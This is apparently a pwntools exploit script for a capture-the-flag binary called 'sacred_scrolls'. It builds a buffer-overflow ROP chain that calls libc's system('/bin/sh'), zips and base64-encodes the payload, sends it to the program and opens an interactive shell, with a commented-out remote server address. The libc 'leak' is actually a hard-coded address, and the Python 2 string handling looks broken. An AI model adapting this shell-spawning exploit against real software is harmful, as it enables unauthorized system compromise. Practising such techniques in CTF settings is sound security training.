from pwn import *
import base64
import os

context.arch = 'amd64'

elf = ELF('./sacred_scrolls')
libc = ELF('./glibc/libc.so.6')

padding = 'A'*(40)

io = process('./sacred_scrolls')
#ip, port = "144.126.232.205", 32161
#io = remote(ip, port)

io.sendlineafter('Enter your wizard tag:','1')
io.sendlineafter('>>', '1')

pop_rdi_ret = 0x00000000004011b3
puts_addr = 0x0000000000602f80
ret = 0x00000000004007ce

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

#payload2: get the shell
rop_libc = ROP(libc)
#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + p64(ret) + rop_libc.chain()

with open('spell.txt', 'wb') as f:
        f.write(payload2)
os.system('zip spell0.zip spell.txt')
os.system('rm -f spell.txt')
payload = os.popen('cat spell0.zip').read()

io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
print base64.b64encode(payload)
print io.sendlineafter('>>', '2')
print io.sendlineafter('>>', '3')
io.recvuntil('\n')
io.recvuntil('\n')

io.interactive()

'''

'''
